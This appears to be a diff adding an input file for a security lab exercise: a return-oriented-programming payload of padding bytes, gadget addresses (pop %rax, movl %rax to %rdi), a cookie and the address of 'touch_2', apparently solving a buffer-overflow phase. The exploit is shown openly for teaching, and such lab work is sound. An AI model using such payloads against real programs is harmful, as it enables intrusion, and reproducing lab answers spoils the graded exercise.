@@ -1,0 +1,16 @@
+ff ff ff ff ff ff ff ff  /* junk */
+ff ff ff ff ff ff ff ff  /* junk */
+ff ff ff ff ff ff ff ff  /* junk */
+ff ff ff ff ff ff ff ff  /* junk */
+ff ff ff ff ff ff ff ff  /* junk */
+ab 19 40 00 00 00 00 00  /* address of pop %rax */
+fa 97 b9 59 00 00 00 00  /* cookie */
+c6 19 40 00 00 00 00 00  /* address of movl %rax, %rdi */
+ec 17 40 00 00 00 00 00  /* address of touch_2 */
+
+
+
+
+
+
+
